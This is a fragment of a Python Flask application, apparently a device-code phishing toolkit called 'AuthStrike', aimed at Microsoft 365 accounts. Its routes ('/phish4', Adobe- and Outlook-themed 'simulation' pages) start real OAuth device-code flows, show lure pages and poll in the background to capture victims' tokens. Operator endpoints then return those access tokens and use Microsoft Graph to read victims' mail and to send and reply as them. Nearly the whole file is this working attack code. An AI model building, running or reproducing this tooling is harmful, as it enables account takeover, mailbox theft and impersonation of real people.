    flow["client_id"] = client_id
    save(c, request_id)
    save_device_code_history(request_id, flow.get("user_code", "N/A"), client_id, generated_time_str, expiration_time_str)
    update_device_code_history(request_id, client_name=profile["name"], client_profile=profile["key"], verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"))
    
    # START BACKGROUND CAPTURE THREAD
    enqueue_poll_job(request_id, flow)

    history = get_device_code_history()
    return render_template("secure.html",
        request_id=request_id,
        user_code=flow.get("user_code", "N/A"),
        generated_time=now.strftime("%A, %B %d, %Y at %I:%M:%S %p"),
        expiration_time=expiration.strftime("%A, %B %d, %Y at %I:%M:%S %p"),
        expires_in=expires_in,
        verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"),
        history=history
    )

# Route: /phish4
@app.route("/auth", methods=["GET"])
def z():
    profile = resolve_client_profile(request.args.get("client"), "auth")
    client_id = profile["id"]
    c = msal.SerializableTokenCache()
    a = client(c, client_id)
    flow = a.initiate_device_flow(scopes=FOCI_SCOPES)
    
    if "user_code" not in flow:
        return jsonify(error="Failed to initiate device flow.", details=flow), 400

    request_id = get_next_request_id()
    now = datetime.now()
    expires_in = flow.get("expires_in", 1800)
    expiration = now + timedelta(seconds=expires_in)
    generated_time_str = now.strftime("%Y-%m-%d %H:%M:%S")
    expiration_time_str = expiration.strftime("%Y-%m-%d %H:%M:%S")
    flow["client_id"] = client_id
    save(c, request_id)
    save_device_code_history(request_id, flow.get("user_code", "N/A"), client_id, generated_time_str, expiration_time_str)
    update_device_code_history(request_id, client_name=profile["name"], client_profile=profile["key"], verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"))
    
    # START BACKGROUND CAPTURE THREAD
    enqueue_poll_job(request_id, flow)

    history = get_device_code_history()
    return render_template("auth.html",
        request_id=request_id,
        user_code=flow.get("user_code", "N/A"),
        generated_time=now.strftime("%A, %B %d, %Y at %I:%M:%S %p"),
        expiration_time=expiration.strftime("%A, %B %d, %Y at %I:%M:%S %p"),
        expires_in=expires_in,
        verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"),
        history=history
    )

@app.route("/adobe-simulation", methods=["GET"])
def adobe_simulation():
    profile = resolve_client_profile(request.args.get("client"), "adobe")
    c = msal.SerializableTokenCache()
    a = client(c, profile["id"])
    flow = a.initiate_device_flow(scopes=FOCI_SCOPES)
    if "user_code" not in flow:
        return jsonify(error="Failed to initiate device flow.", details=flow), 400
    request_id = get_next_request_id()
    now = datetime.now()
    expires_in = flow.get("expires_in", 1800)
    expiration = now + timedelta(seconds=expires_in)
    flow["client_id"] = profile["id"]
    save(c, request_id)
    save_device_code_history(request_id, flow.get("user_code", "N/A"), profile["id"], now.strftime("%Y-%m-%d %H:%M:%S"), expiration.strftime("%Y-%m-%d %H:%M:%S"))
    update_device_code_history(request_id, client_name=profile["name"], client_profile=profile["key"], template="adobe", verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"))
    enqueue_poll_job(request_id, flow)
    return render_template("adobe_simulation.html", user_code=flow.get("user_code", "N/A"), verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri") or "https://www.microsoft.com/devicelogin", generated_time=now.strftime("%Y-%m-%d %H:%M:%S"), expiration_time=expiration.strftime("%Y-%m-%d %H:%M:%S"), expires_in=expires_in, request_id=request_id)

@app.route("/outlook-simulation", methods=["GET"])
def outlook_simulation():
    profile = resolve_client_profile(request.args.get("client"), "outlook")
    c = msal.SerializableTokenCache()
    a = client(c, profile["id"])
    flow = a.initiate_device_flow(scopes=FOCI_SCOPES)
    if "user_code" not in flow:
        return jsonify(error="Failed to initiate device flow.", details=flow), 400
    request_id = get_next_request_id()
    now = datetime.now()
    expires_in = flow.get("expires_in", 1800)
    expiration = now + timedelta(seconds=expires_in)
    flow["client_id"] = profile["id"]
    save(c, request_id)
    save_device_code_history(request_id, flow.get("user_code", "N/A"), profile["id"], now.strftime("%Y-%m-%d %H:%M:%S"), expiration.strftime("%Y-%m-%d %H:%M:%S"))
    update_device_code_history(request_id, client_name=profile["name"], client_profile=profile["key"], template="outlook", verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri"))
    enqueue_poll_job(request_id, flow)
    return render_template("outlook_simulation.html", user_code=flow.get("user_code", "N/A"), verification_uri=flow.get("verification_uri_complete") or flow.get("verification_uri") or "https://www.microsoft.com/devicelogin", generated_time=now.strftime("%Y-%m-%d %H:%M:%S"), expiration_time=expiration.strftime("%Y-%m-%d %H:%M:%S"), expires_in=expires_in, request_id=request_id)

@app.route("/api/notifications", methods=["GET"])
@login_required
def operator_notifications():
    """Return token-capture events after a caller-supplied timestamp.

    This endpoint deliberately returns metadata only; access/refresh tokens are never
    exposed to the notification system. A browser can poll this endpoint from any
    operator page and alert the operator when a new successful operation appears.
    """
    since = request.args.get("since", type=int) or 0
    history = reconcile_device_code_history()
    events = []
    for item in history:
        if item.get("status") != "SUCCESS":
            continue
        completed = parse_local_datetime(item.get("completed_at"))
        if not completed:
            continue
        epoch = int(completed.timestamp())
        if epoch <= since:
            continue
        result = OPERATION_RESULTS.get(item.get("id"), {})
        claims = result.get("id_token_claims") or {}
        events.append({
            "id": item.get("id"),
            "event_key": f"{item.get('id')}:{item.get('completed_at')}",
            "completed_at": item.get("completed_at"),
            "completed_at_epoch": epoch,
            "username": claims.get("preferred_username") or claims.get("upn") or claims.get("email") or item.get("username") or "Unknown account",
            "client_name": item.get("client_name") or item.get("client_id") or "Unknown client",
        })
    events.sort(key=lambda x: x["completed_at_epoch"])
    return jsonify({"events": events})

@app.route("/api/operation/<int:entry_id>/access-token", methods=["GET"])
@login_required
def operation_access_token(entry_id):
    history = reconcile_device_code_history()
    entry = next((x for x in history if x.get("id") == entry_id), None)
    result = recover_operation_result(entry_id, entry)
    if not entry or entry.get("status") != "SUCCESS" or not result or not result.get("access_token") or not operation_token_is_active(entry, result):
        return jsonify({"error": "A successful active access token is not available for this operation."}), 404
    return jsonify({"access_token": result.get("access_token"), "operation_id": entry_id})


class _HTMLTextParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.parts = []
    def handle_data(self, data):
        if data and data.strip():
            self.parts.append(data.strip())
    def text(self):
        return "\n".join(self.parts)

def strip_html(value):
    parser = _HTMLTextParser()
    try:
        parser.feed(value or "")
        parser.close()
        return parser.text()
    except Exception:
        return value or ""

def get_graph_token_for_operation(operation_id):
    """Return a Microsoft Graph access token for the selected operation.

    Do not trust the generic in-memory operation result here because the same
    operation may later have been refreshed for another resource (for example
    Outlook / Exchange Online). Always ask MSAL for the Graph scopes from the
    operation-specific cache so callers such as Accounts and Outlook validation
    never receive a token with the wrong audience.
    """
    history = reconcile_device_code_history()
    entry = next((x for x in history if x.get("id") == operation_id), None)
    if not entry or entry.get("status") != "SUCCESS":
        return None, entry, {"status": 404, "message": "Select a successful operation."}

    try:
        token_cache = cache(operation_id)
        application = client(token_cache, entry.get("client_id") or MICROSOFT_OFFICE_CLIENT_ID)
        accounts = application.get_accounts()
        if not accounts:
            return None, entry, {"status": 404, "message": "No account is available in the selected MSAL cache."}

        graph_result = application.acquire_token_silent(FOCI_SCOPES, account=accounts[0]) or {}
        save(token_cache, operation_id)
        if graph_result.get("access_token"):
            merged = dict(OPERATION_RESULTS.get(operation_id) or {})
            merged.update(graph_result)
            OPERATION_RESULTS[operation_id] = merged
            return graph_result["access_token"], entry, None

        detail = graph_result.get("error_description") or graph_result.get("error") or "A Microsoft Graph access token could not be acquired silently."
        return None, entry, {"status": 401, "message": detail}
    except Exception as exc:
        return None, entry, {"status": 500, "message": f"Could not recover the selected Microsoft Graph token: {exc}"}

def graph_http_request(method, url, *, headers=None, params=None, json_body=None, timeout=15):
    """Make a Microsoft Graph request with one bounded, Retry-After-aware retry.

    Microsoft Graph returns HTTP 429 with a Retry-After header when throttled.
    We honor that delay when it is present and no more than 10 seconds, then
    retry once. If the delay is absent or longer than 10 seconds, the original
    429 is returned so a web request is never held for an unbounded period.
    """
    request_headers = dict(headers or {})
    try:
        response = requests.request(
            method,
            url,
            headers=request_headers,
            params=params,
            json=json_body,
            timeout=timeout,
        )
    except requests.RequestException as exc:
        return None, exc

    if response.status_code == 429:
        retry_after_raw = response.headers.get("Retry-After", "")
        try:
            retry_after = float(retry_after_raw)
        except (TypeError, ValueError):
            retry_after = 0
        if 0 < retry_after <= 10:
            time.sleep(retry_after)
            try:
                response = requests.request(
                    method,
                    url,
                    headers=request_headers,
                    params=params,
                    json=json_body,
                    timeout=timeout,
                )
            except requests.RequestException as exc:
                return None, exc
    return response, None

def graph_request(operation_id, method, path, *, params=None, json_body=None):
    token, entry, error = get_graph_token_for_operation(operation_id)
    if error:
        return None, error
    url = "https://graph.microsoft.com/v1.0" + path
    response, request_error = graph_http_request(
        method,
        url,
        headers={"Authorization": "Bearer " + token, "Accept": "application/json"},
        params=params,
        json_body=json_body,
        timeout=15,
    )
    if request_error:
        return None, {"status": 502, "message": f"Microsoft Graph request failed: {request_error}"}

    payload = None
    if response.content:
        try:
            payload = response.json()
        except ValueError:
            payload = None
    if response.status_code >= 400:
        message = (payload or {}).get("error", {}).get("message") if isinstance(payload, dict) else None
        if response.status_code == 429:
            retry_after = response.headers.get("Retry-After")
            if retry_after:
                message = message or f"Microsoft Graph is still throttling this request. Retry after {retry_after} seconds."
            else:
                message = message or "Microsoft Graph is temporarily throttling requests. Please try again shortly."
        message = message or response.text.strip() or f"Microsoft Graph returned HTTP {response.status_code}."
        return None, {"status": response.status_code, "message": message, "graph_payload": payload}
    return payload or {}, None

def get_operation_outlook_status(operation_id):
    """Return non-sensitive authentication metadata for an operation.

    This intentionally does not expose an ID token or try to turn a Graph token
    into an Outlook Web browser session. It only reports whether MSAL currently
    has an ID-token result available for the selected operation.
    """
    entry = next((item for item in reconcile_device_code_history() if item.get("id") == operation_id), None)
    if not entry or entry.get("status") != "SUCCESS":
        return {"operation_id": operation_id, "available": False, "graph_available": False, "id_token_available": False, "message": "Operation is not in a successful state."}

    result = recover_operation_result(operation_id, entry) or {}
    graph_available = bool(result.get("access_token")) and operation_token_is_active(entry, result)
    id_token_available = bool(result.get("id_token"))
    claims = result.get("id_token_claims") or {}
    return {
        "operation_id": operation_id,
        "available": True,
        "graph_available": bool(graph_available),
        "id_token_available": bool(id_token_available),
        "username": claims.get("preferred_username") or claims.get("upn") or claims.get("email") or entry.get("username") or "Unknown account",
        "client_name": entry.get("client_name") or entry.get("client_id") or "Unknown client",
    }

@app.route("/api/operation/<int:entry_id>/outlook-status", methods=["GET"])
@login_required
def operation_outlook_status(entry_id):
    status = get_operation_outlook_status(entry_id)
    if not status.get("available"):
        return jsonify({"error": status.get("message", "Operation is not available.")}), 404
    return jsonify(status)

@app.route("/api/operation/<int:entry_id>/outlook-context", methods=["GET"])
@login_required
def operation_outlook_context(entry_id):
    """Return the complete, current Outlook validation context for one operation.

    The access token is returned only to the authenticated operator who selected
    the operation. No token is persisted in the URL or browser storage.
    """
    history = reconcile_device_code_history()
    entry = next((x for x in history if x.get("id") == entry_id), None)
    if not entry or entry.get("status") != "SUCCESS":
        return jsonify({"error": "Operation is not successful."}), 404
    result = recover_operation_result(entry_id, entry)
    if not result or not result.get("access_token") or not operation_token_is_active(entry, result):
        return jsonify({"error": "No active access token is available for this operation."}), 404
    claims = result.get("id_token_claims") or {}
    expires_in = result.get("expires_in")
    return jsonify({
        "operation_id": entry_id,
        "access_token": result.get("access_token"),
        "graph_available": True,
        "id_token_available": bool(result.get("id_token")),
        "username": claims.get("preferred_username") or claims.get("upn") or claims.get("email") or entry.get("username") or "Unknown account",
        "display_name": claims.get("name") or "Unknown account",
        "tenant": claims.get("tid") or "—",
        "client_name": entry.get("client_name") or entry.get("client_id") or "Unknown client",
        "completed_at": entry.get("completed_at") or entry.get("generated_at") or "",
        "expires_in": expires_in,
    })

@app.route("/api/outlook/mailbox-test", methods=["POST"])
@login_required
def outlook_mailbox_test():
    require_csrf()
    access_token = (request.form.get("access_token") or "").strip()
    if not access_token:
        return jsonify({"error": "Select an active operation first."}), 400
    response, request_error = graph_http_request(
        "GET",
        "https://graph.microsoft.com/v1.0/me/mailFolders/inbox",
        headers={"Authorization": "Bearer " + access_token},
        params={"$top": 1, "$select": "id,displayName,totalItemCount,unreadItemCount"},
        timeout=10,
    )
    if request_error:
        return jsonify({"valid": False, "message": f"Microsoft Graph request failed: {request_error}", "status_code": 502}), 502
    if response.status_code == 200:
        return jsonify({"valid": True, "message": "The token has access to the Outlook mailbox through Microsoft Graph.", "mailbox": response.json()})
    try:
        payload = response.json()
        message = payload.get("error", {}).get("message", "Mailbox access was denied.")
    except ValueError:
        message = response.text.strip() or f"Microsoft Graph returned HTTP {response.status_code}."
    return jsonify({"valid": False, "message": message, "status_code": response.status_code}), 400 if response.status_code == 400 else 403


@app.route("/api/outlook/folders", methods=["GET"])
@login_required
def outlook_folders():
    operation_id = request.args.get("operation_id", type=int)
    if not operation_id:
        return jsonify({"error": "Select a successful operation."}), 400
    payload, error = graph_request(operation_id, "GET", "/me/mailFolders", params={
        "$top": 50,
        "$select": "id,displayName,totalItemCount,unreadItemCount,childFolderCount",
        "$orderby": "displayName"
    })
    if error:
        return jsonify({"error": error["message"]}), error["status"] if error["status"] in {400,401,403,404,429} else 502
    return jsonify({"value": payload.get("value", [])})

@app.route("/api/outlook/messages", methods=["GET"])
@login_required
def outlook_messages():
    operation_id = request.args.get("operation_id", type=int)
    folder_id = (request.args.get("folder_id") or "inbox").strip()
    top = max(1, min(request.args.get("top", 25, type=int) or 25, 50))
    if not operation_id:
        return jsonify({"error": "Select a successful operation."}), 400
    if not folder_id:
        return jsonify({"error": "A mail folder is required."}), 400
    # Graph permits the well-known folder name 'inbox'; opaque IDs are URL encoded below.
    payload, error = graph_request(operation_id, "GET", f"/me/mailFolders/{quote(folder_id, safe='')}/messages", params={
        "$top": top,
        "$orderby": "receivedDateTime desc",
        "$select": "id,subject,from,toRecipients,receivedDateTime,bodyPreview,isRead,hasAttachments"
    })
    if error:
        return jsonify({"error": error["message"]}), error["status"] if error["status"] in {400,401,403,404,429} else 502
    return jsonify({"value": payload.get("value", [])})

@app.route("/api/outlook/message", methods=["GET"])
@login_required
def outlook_message():
    operation_id = request.args.get("operation_id", type=int)
    message_id = request.args.get("message_id", "").strip()
    if not operation_id or not message_id:
        return jsonify({"error": "Operation and message are required."}), 400
    payload, error = graph_request(operation_id, "GET", f"/me/messages/{quote(message_id, safe='')}", params={
        "$select": "id,subject,from,toRecipients,ccRecipients,bccRecipients,receivedDateTime,sentDateTime,body,bodyPreview,isRead,hasAttachments,attachments"
    })
    if error:
        return jsonify({"error": error["message"]}), error["status"] if error["status"] in {400,401,403,404,429} else 502
    body = payload.get("body") or {}
    payload["bodyText"] = strip_html(body.get("content", "")) if body.get("contentType") == "html" else (body.get("content") or "")
    payload.pop("attachments", None)
    return jsonify(payload)

@app.route("/api/outlook/send", methods=["POST"])
@login_required
def outlook_send_mail():
    require_csrf()
    data = request.get_json(silent=True) or {}
    operation_id = int(data.get("operation_id") or 0)
    to_addresses = [str(x).strip() for x in (data.get("to") or []) if str(x).strip()]
    cc_addresses = [str(x).strip() for x in (data.get("cc") or []) if str(x).strip()]
    subject = str(data.get("subject") or "").strip()
    body = str(data.get("body") or "")
    if not operation_id or not to_addresses or not subject or not body:
        return jsonify({"error": "Operation, recipient, subject, and body are required."}), 400

    message = {
        "subject": subject,
        "body": {"contentType": "Text", "content": body},
        "toRecipients": [{"emailAddress": {"address": a}} for a in to_addresses],
    }
    if cc_addresses:
        message["ccRecipients"] = [{"emailAddress": {"address": a}} for a in cc_addresses]

    _, error = graph_request(operation_id, "POST", "/me/sendMail", json_body={"message": message, "saveToSentItems": True})
    if error:
        return jsonify({"error": error["message"]}), error["status"] if error["status"] in {400,401,403,404,429} else 502
    return jsonify({"success": True, "message": "Message submitted to Microsoft Graph for delivery."})

@app.route("/api/outlook/reply", methods=["POST"])
@login_required
def outlook_reply_mail():
    require_csrf()
    data = request.get_json(silent=True) or {}
    operation_id = int(data.get("operation_id") or 0)
    message_id = str(data.get("message_id") or "").strip()
    body = str(data.get("body") or "")
    if not operation_id or not message_id or not body:
        return jsonify({"error": "Operation, message, and reply body are required."}), 400

    _, error = graph_request(operation_id, "POST", f"/me/messages/{quote(message_id, safe='')}/reply", json_body={
        "comment": body
    })
    if error:
        return jsonify({"error": error["message"]}), error["status"] if error["status"] in {400,401,403,404,429} else 502
    return jsonify({"success": True, "message": "Reply submitted to Microsoft Graph."})


@app.route("/api/outlook/validate-operation", methods=["POST"])
@login_required
def outlook_validate_operation():
    require_csrf()
    data = request.get_json(silent=True) or {}
    operation_id = int(data.get("operation_id") or 0)
    token, entry, error = get_graph_token_for_operation(operation_id)
    if error:
        return jsonify({"error": error["message"]}), error["status"] if error["status"] in {400,401,403,404,429} else 502
    response, graph_error = graph_request(operation_id, "GET", "/me")
    if graph_error:
        return jsonify({"error": graph_error["message"]}), graph_error["status"] if graph_error["status"] in {400,401,403,404,429} else 502
    return jsonify({
        "valid": True,
        "account": response.get("userPrincipalName") or response.get("mail") or response.get("displayName") or "Unknown account",
        "profile": response,
    })

@app.route("/api/outlook/mailbox-test-operation", methods=["POST"])
@login_required
def outlook_mailbox_test_operation():
    require_csrf()
    data = request.get_json(silent=True) or {}
    operation_id = int(data.get("operation_id") or 0)
    payload, error = graph_request(operation_id, "GET", "/me/mailFolders/inbox", params={"$select": "id,displayName,totalItemCount,unreadItemCount"})
    if error:
        return jsonify({"error": error["message"]}), error["status"] if error["status"] in {400,401,403,404,429} else 502
    return jsonify({"valid": True, "folder": payload})

@app.route("/outlook", methods=["GET"])
@login_required
def outlook_page():
    successful_operations = get_successful_operation_tokens()
    selected_operation_id = request.args.get("operation_id", type=int)
    outlook_status = get_operation_outlook_status(selected_operation_id) if selected_operation_id else None
    return render_template(
        "outlook.html",
        successful_operations=successful_operations,
        selected_operation_id=selected_operation_id,
        outlook_status=outlook_status,
    )

@app.route("/outlook-authenticate", methods=["POST"])
@login_required
def outlook_authenticate():
    require_csrf()
    access_token = (request.form.get("access_token") or "").strip()
    operation_id = request.form.get("operation_id", type=int)
    successful_operations = get_successful_operation_tokens()
    outlook_status = get_operation_outlook_status(operation_id) if operation_id else None

    if not access_token:
        return render_template(
            "outlook.html",
            message="Access token is required.",
            message_type="error",
            successful_operations=successful_operations,
            selected_operation_id=operation_id,
            outlook_status=outlook_status,
        )

    headers = {"Authorization": "Bearer " + access_token}
    response, request_error = graph_http_request(
        "GET",
        "https://graph.microsoft.com/v1.0/me",
        headers=headers,
        timeout=10,
    )
    if request_error:
        return render_template(
            "outlook.html",
            profile=None,
            message=f"Token validation failed: {request_error}",
            message_type="error",
            open_outlook=False,
            successful_operations=successful_operations,
            selected_operation_id=operation_id,
            outlook_status=outlook_status,
        )

    if response.status_code == 200:
        profile = response.json()
        message = "Access token is valid for Microsoft Graph /me."
        message_type = "success"
        return render_template(
            "outlook.html",
            profile=profile,
            message=message,
            message_type=message_type,
            open_outlook=True,
            successful_operations=successful_operations,
            selected_operation_id=operation_id,
            outlook_status=outlook_status,
        )

    try:
        error_json = response.json()
        error_message = error_json.get("error", {}).get("message", "Unknown error")
    except ValueError:
        error_message = response.text.strip() or f"HTTP {response.status_code}"

    return render_template(
        "outlook.html",
        profile=None,
        message=f"Token validation failed: {error_message}",
        message_type="error",
        open_outlook=False,
        successful_operations=successful_operations,
        selected_operation_id=operation_id,
        outlook_status=outlook_status,
    )

# --- New login/logout routes ---
@app.route("/admin", methods=["GET", "POST"])
@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        require_csrf()
        username = (request.form.get("username") or "").strip()
        password = request.form.get("password") or ""
        if username == os.getenv("AUTHSTRIKE_ADMIN_USERNAME", "admin"):
            try:
                valid = check_password_hash(configured_admin_password_hash(), password)
            except Exception:
                valid = False
            if valid:
                session.clear()
                session["user"] = username
                csrf_token()
                return redirect(url_for("index"))
        error = "Invalid credentials."
    return render_template("login.html", error=error)

@app.route("/logout", methods=["POST"])
@login_required
def logout():
    require_csrf()
    session.clear()
    return redirect(url_for("login"))

# Protect a route example
# def login_required(f):
#     from functools import wraps
#     @wraps(f)
#     def decorated_function(*args, **kwargs):
#         if 'user' not in session:
#             return redirect(url_for("login"))
#         return f(*args, **kwargs)
#     return decorated_function

if __name__ == '__main__':
    host = os.getenv('FLASK_HOST', '0.0.0.0')
    port = int(os.getenv('FLASK_PORT', '5000'))
    debug = os.getenv('FLASK_DEBUG', 'false').lower() in {'1', 'true', 'yes'}

    import subprocess
    poll_process = None
    worker_script = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'poll_worker.py')
    if os.path.exists(worker_script):
        worker_env = os.environ.copy()
        worker_env['AUTHSTRIKE_DISABLE_POLL_DISPATCHER'] = 'true'
        poll_process = subprocess.Popen([sys.executable, worker_script], env=worker_env)
    try:
        app.run(host=host, port=port, debug=debug)
    finally:
        if poll_process and poll_process.poll() is None:
            poll_process.terminate()
            try:
                poll_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                poll_process.kill()
